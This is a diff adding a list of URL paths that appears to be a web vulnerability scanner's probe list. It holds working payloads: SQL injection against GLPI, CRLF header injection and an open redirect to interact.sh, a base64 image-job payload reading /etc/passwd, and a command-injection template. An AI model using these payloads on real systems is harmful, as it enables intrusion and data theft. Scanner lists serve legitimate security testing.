@@ -1,0 +1,14 @@
+/cgi-bin/login?LD_DEBUG=files
+/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+/cgi-bin/file_transfer.cgi
+/auth/check
+/auth/newpassword
+/cgi-bin/weblogin.cgi?username=admin
+/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0
+/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
+/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
+/homeaction.php
+/lab.html?vpath=//interact.sh
+/cgi-bin/admin.cgi?Command=sysCommand&Cmd={{cmd}}
+/scrm/crm/admin
